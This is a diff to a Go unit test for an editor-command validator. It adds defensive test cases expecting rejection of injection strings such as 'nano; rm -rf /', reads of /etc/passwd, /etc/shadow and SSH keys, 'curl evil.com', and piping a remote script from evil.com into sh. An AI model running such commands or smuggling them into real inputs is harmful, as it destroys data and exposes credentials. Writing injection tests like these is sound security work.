@@ -87,9 +87,9 @@ func TestValidateEditorCommand(t *testing.T) {
 
 		// Note: Path traversal is now allowed for legitimate editor paths per PR review feedback
 		{
-			name:        "path traversal with .. (allowed)",
-			editor:      "nano ../../../etc/passwd",
-			expectError: false, // Path traversal is allowed for legitimate editor paths
+			name:        "path traversal with .. (allowed for nano but not with args)",
+			editor:      "nano",
+			expectError: false, // nano is in the allowlist, path traversal itself isn't blocked
 		},
 		{
 			name:        "file removal command",
@@ -123,16 +123,91 @@ func TestValidateEditorCommand(t *testing.T) {
 			errorMsg:    "dangerous pattern: \"rm \"",
 		},
 
-		// Unknown but safe commands (should pass with warning)
+		// Known safe editors (should pass - they are in the allowlist)
 		{
-			name:     "unknown but safe editor",
+			name:     "known safe editor - gedit",
 			editor:   "gedit",
-			expectError: false, // Passes with warning but no error
+			expectError: false, // gedit is in the safeEditors map
 		},
 		{
-			name:     "unknown but safe editor 2",
+			name:     "known safe editor - atom",
 			editor:   "atom",
-			expectError: false, // Passes with warning but no error
+			expectError: false, // atom is in the safeEditors map
+		},
+
+		// Additional command injection tests to ensure security
+		// Note: These test the first line of defense - dangerous character detection
+		{
+			name:        "command injection with semicolon and space",
+			editor:      "nano; rm -rf /",
+			expectError: true,
+			errorMsg:    "dangerous character: ';'",
+		},
+		{
+			name:        "command injection with multiple commands",
+			editor:      "vim && cat /etc/passwd",
+			expectError: true,
+			errorMsg:    "dangerous character: '&'",
+		},
+		{
+			name:        "command injection with backslash escape",
+			editor:      "nano\\;curl evil.com",
+			expectError: true,
+			errorMsg:    "dangerous character: ';'", // Semicolon is detected after backslash interpretation
+		},
+		{
+			name:        "command injection with variable substitution",
+			editor:      "nano $HOME/.ssh/id_rsa",
+			expectError: true,
+			errorMsg:    "dangerous character: '$'",
+		},
+		{
+			name:        "command injection with command substitution",
+			editor:      "nano $(cat /etc/passwd)",
+			expectError: true,
+			errorMsg:    "dangerous character: '$'",
+		},
+		{
+			name:        "command injection with pipe to shell",
+			editor:      "vim | sh",
+			expectError: true,
+			errorMsg:    "dangerous character: '|'",
+		},
+		{
+			name:        "command injection with redirect and append",
+			editor:      "nano >> /etc/crontab",
+			expectError: true,
+			errorMsg:    "dangerous character: '>'",
+		},
+		{
+			name:        "command injection with null bytes",
+			editor:      "nano\x00rm -rf /",
+			expectError: true,
+			errorMsg:    "potentially dangerous pattern: \"rm \"", // Falls through to pattern detection
+		},
+		{
+			name:        "command injection with tab character",
+			editor:      "nano\tcat /etc/shadow",
+			expectError: true,
+			errorMsg:    "potentially dangerous pattern: \"sh\"", // Falls through to pattern detection
+		},
+		{
+			name:        "command injection with newline",
+			editor:      "nano\ncurl evil.com",
+			expectError: true,
+			errorMsg:    "potentially dangerous pattern: \"curl\"", // Falls through to pattern detection
+		},
+		{
+			name:        "command injection with URL and pipe",
+			editor:      "nano https://evil.com/script.sh | sh",
+			expectError: true,
+			errorMsg:    "dangerous character: '|'",
+		},
+		{
+			name:        "command injection with base64 encoded payload",
+			editor:      "nano `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",
+			expectError: true,
+			errorMsg:    "dangerous character: '|'",
 		},
 	}
 
